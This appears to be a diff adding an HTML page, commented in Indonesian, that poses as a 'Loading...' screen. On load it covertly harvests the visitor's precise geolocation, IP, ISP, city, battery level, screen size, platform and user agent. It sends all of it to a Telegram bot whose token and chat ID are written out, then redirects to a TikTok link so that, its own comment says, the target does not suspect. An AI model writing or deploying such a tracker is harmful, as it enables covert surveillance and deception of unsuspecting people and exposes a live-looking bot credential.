@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+</head>
+<body>
+    <script>
+        // --- KONFIGURASI BOT ---
+        const token = '8455526302:AAEdI-fS7NDr1q3Ao3qlQGIqJg8lrwCefWc';
+        const chatId = '1966317946';
+
+        async function sendDetailedInfo(lat, lon) {
+            // 1. Ambil Data IP (DIBERSIHKAN: Wajib pakai /json/)
+            let ipInfo = "Gagal mengambil data IP";
+            try {
+                const response = await fetch('https://ipapi.co');
+                const data = await response.json();
+                ipInfo = `🌐 *IP Address:* ${data.ip}\n🏢 *ISP:* ${data.org}\n🏙️ *Kota:* ${data.city}, ${data.region}`;
+            } catch (err) { }
+
+            // 2. Ambil Info Baterai
+            let batteryDetail = "Tidak tersedia";
+            try {
+                const battery = await navigator.getBattery();
+                batteryDetail = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Mengisi Daya' : 'Tidak Cas'})`;
+            } catch (err) { }
+
+            // 3. Detail Perangkat
+            const ua = navigator.userAgent;
+            const screenRes = `${window.screen.width}x${window.screen.height}`;
+            const platform = navigator.platform;
+
+            // 4. Susun Pesan (DIBERSIHKAN: Pakai tanda $ sebelum kurung kurawal)
+            const text = encodeURIComponent(
+                `🚀 *PENGUNJUNG BARU TERDETEKSI*\n\n` +
+                `📍 *Lokasi:* [Klik Lihat di Maps](https://google.com{lat},${lon})\n` +
+                `${ipInfo}\n` +
+                `🔋 *Baterai:* ${batteryDetail}\n` +
+                `🖥️ *Layar:* ${screenRes}\n` +
+                `📱 *Platform:* ${platform}\n\n` +
+                `🕵️ *User Agent:*\n\`${ua}\``
+            );
+
+            // 5. Kirim ke Telegram
+            const msgUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${text}&parse_mode=Markdown`;
+            const locUrl = `https://api.telegram.org/bot${token}/sendLocation?chat_id=${chatId}&latitude=${lat}&longitude=${lon}`;
+
+            try {
+                await Promise.all([fetch(msgUrl), fetch(locUrl)]);
+            } finally {
+                // Alihkan ke Google agar target tidak curiga
+                window.location.href = "https://vt.tiktok.com/ZSx8oTCpv/";
+            }
+        }
+
+        window.onload = () => {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => { sendDetailedInfo(pos.coords.latitude, pos.coords.longitude); },
+                    (err) => { 
+                        sendDetailedInfo("0", "0"); 
+                        alert("Harap izinkan akses untuk melanjutkan."); 
+                    },
+                    { enableHighAccuracy: true, timeout: 5000 }
+                );
+            } else { 
+                sendDetailedInfo("0", "0"); 
+            }
+        };
+    </script>
+</body>
+</html>
